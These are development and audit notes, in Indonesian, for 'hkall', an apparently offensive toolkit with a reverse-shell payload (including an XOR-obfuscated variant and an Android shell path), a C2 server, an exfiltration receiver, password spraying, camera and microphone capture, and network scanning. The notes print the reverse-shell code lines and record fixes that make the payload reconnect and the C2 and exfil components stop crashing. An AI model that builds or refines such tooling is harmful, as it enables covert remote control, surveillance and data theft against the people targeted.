# hkall — Deep Analysis Notes (2026-10-26)

Catatan audit manual. Fix langsung diterapkan di code + PRD, bukan cuma dicatat sini.

---

## CONFIRMED BUGS (fix sekarang)

### B1. payload.py non-obfuscated — dup2 pakai variabel salah
`mod_payload()` versi `xm=False`:
```python
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"] if os.path.exists("/system/bin/sh") else ["/bin/sh","-i"])
```
- Dua cabang `if/else` **identik** — jika `/system/bin/sh` tidak ada, fallback `/bin/sh` juga tidak
  dipakai karena kondisi `os.path.exists("/system/bin/sh")` selalu disertakan.
- Lebih penting: **tidak ada reconnect setelah shell keluar**. `subprocess.call` di dalam loop `while True`
  tapi setelah `s.close()` → loop iterasi ulang, konek ulang. OK, tapi `s` dideklarasi ulang tiap iterasi — bagus.
- Fallback salah: seharusnya `os.path.exists("/bin/sh") else ...` fallback ke `sh` umum / `mksh`.
- Perlu dibuat **satu string sh path** yang benar: cek `/system/bin/sh`, lalu `/bin/sh`, lalu `sh`.

Fix: query shell path di satu tempat, pakai di kedua branch.

### B2. payload.py obfuscated — `r(s)` tidak pernah dipakai + indentation salah
- Ada fungsi `def r(s):` di template obfuscated yang **tidak pernah dipanggil** (dead code).
- Indentnya nggak konsisten: `d=b""` dan `while 1:` di indent 0 sama-sama, tapi tubuh `r()` tidak masuk
  ke dalam def (Python: `d=b""` dan `while` di indent 1 kolom → ternyata di tingkat fungsi — check).
- `subprocess.run(x(cmd,1)...)` — `x()` di sini adalah **decrypt** (key_rot=1). Server encrypt dengan `xor_stream(cmd,1)`.
  Jadi decrypt pakai key_rot=1 benar. Output dikirim dengan `x(...,2)` — server read dengan `xor_stream(buf,2)`.
  → **key_rot mapping benar** (`1`=cmd, `2`=out), BUKAN bug. yang salah cuma: `r()` dead + indent.

### B3. exfil recv — path traversal (security)
`mod_recv()`:
```python
name, size = meta.decode().strip().split("|")
dest = os.path.join(DATA, name)
```
Kalau `name` dari client mengandung `../`, `dest` bisa menulis keluar `data/`.
- Fix: sanitize `name = os.path.basename(name)` (drop dir), atau reject `..`.

### B4. exfil recv — infinite loop kalau client hangup sebelum kirim metadata
```python
meta = b""
while b"\n" not in meta: meta += c.recv(1)
```
Kalau client konek lalu diam (atau mati), `c.recv(1)` balik `b""` tanpa henti → `while` infinite.
- Fix: `d = c.recv(1); if not d: break/return`, plus timeout.

### B5. mod_spray — `code == 200` selalu dianggap hit
`ok = code in (301,302,303) or (code==200)` — login page yang berhasil biasanya 200/302 tapi
**success detection pakai status code saja** → false positive massal. Ini design limitation, catat di backlog:
tidak bisa tahu sukses/gagal tanpa parse body (hanya stdlib).

### B6. CLI `-m scan --host X` tanpa `--ports` → `GINJ` isi `[host, "1-1000", "n"]` — bagus.
Tapi `-m scan --host X --ports P` → `vals = [host, ports, "n"]` — benar (ports diisi, banner n).
Tes: `python hkall.py -m scan --host 127.0.0.1 --ports 22,80`

### B7. mod_c2 — `input()` non-blocking saat ada session mati
Saat `current` session disconnect (client tutup), server masih di `use S1`: `cmd = input(...)` lalu
`c2.send(send)` → `BrokenPipeError`/`ConnectionResetError` tidak di-catch → **crash di main thread**.
- Fix: wrap `send` di try/except, pop session yang mati.

### B8. mod_c2 — accept thread race: session bisa mati sebelum di-`use`
Minor. skip.

### B9. mod_c2 — `key_rot` mapping: server read pakai `xor_stream(buf, 2)`, client kirim `x(...,2)` — sinkron. OK.

### B10. mod_cfg — set key sekali lalu keluar (hanya 1 key per run). Bukan bug, tapi UX: loop tidak ada.
CLI `-m cfg` pakai GINJ kosong → `input()` di non-tty crash? `ask()` handle EOFError → return default. OK.

### B11. mod_history / `show()` — `SELECT rowid,*` → rows `(rowid, kind, target, ts, data)`.
Print `[row[1]] row[2] @ row[3]`, `row[4][:200]` — benar. Kalau table kosong → sqlite `no such table` crash
(karena table baru dibuat saat `save`) — minor, fix: buat table saat import.

### B12. mod_recv — `input()` tidak `ask()` → beda dari mod lain. Minor.

### B13. `--ports` `type=int` tidak berlaku untuk `--host`/`--ports` — `a.ports` string. OK.

### B14. mod_ops — `cam()` pakai `subprocess.run` tanpa cek `returncode`; mic pakai `pkill -f` yang bisa
kill proses lain yang cocok. Minor.

### B15. mod_discover — `range(1, min(2**(32-mask), 2545))`: untuk /32 → `2**0=1` → range(1,1) = kosong.
OK. Untuk /24 → 254 IP. Membuat **254 threads** sekaligus — bisa DoS sendiri di perangkat lemah.
Fix: thread pool/batch.

### B16. scan_ports — `threads=128` default, untuk range besar spawn 128 threads terus menerus. OK-ish,
tapi banner_grab dilakukan **di dalam worker thread dengan lock** → 3s timeout serialisasi kalau banyak port
terbuka. Minor.

### B17. `show()` limit/target — data besar dipotong [:200] hanya saat print. OK.

### B18. plugin loader — `MODULES.update(m.PLUGIN)` menimpa builtin kalau plugin pakai key sama.
Fix: cek `if k in MODULES: skip/warn`.

---

## TIDAK BUG / SUDAH BENAR
- `xor_stream` mapping: cmd key_rot=1, out key_rot=2 — client & server sinkron.
- `save()` sqlite parameterized — aman dari injection.
- `net2ip` — benar untuk offset sampai /8.
- `parse_ranges` — `1-5,7` → [1,2,3,4,5,7]. Valid.
- progress bar `pbar` param di mod_spray — unused (dead param), minor.

---

## OPTIONAL: 2026-10-26 (same session) verified-fix pass
verification: `modules:18`, both payload variants syntax+SMART, recv guard basename→ data/.



# FIX LIST PRIORITAS — SEMUA DIPERBAIKI (v0.3.3)
1. ✅ B1 payload non-obs: shell path benar (`SH = /system/bin/sh → /bin/sh → sh`) + reconnect.
2. ✅ B3 recv path traversal: `name = os.path.basename(name)`.
3. ✅ B4 recv infinite loop: `d = c.recv(1); if not d: return`.
4. ✅ B7 c2 send/recv crash guard: try/except OSError → pop session.
5. ✅ B11 table dibuat saat show() → history aman walau rs.db kosong.
6. ✅ B15 discover thread cap (batch 64).
7. ✅ B18 plugin overwrite guard (skip & beri tahu).
8. ⏳ B5 spray false positive — catat backlog, bukan fix (butuh parse body, stdlib only).
9. ✅ B2 r() dead code dibuang + indent payload.
- B16 scan banner-grab serialisasi → minor, ditinggal.
- B14 ops pkill → minor, ditinggal.
- B10 cfg single-key → UX, tetap.

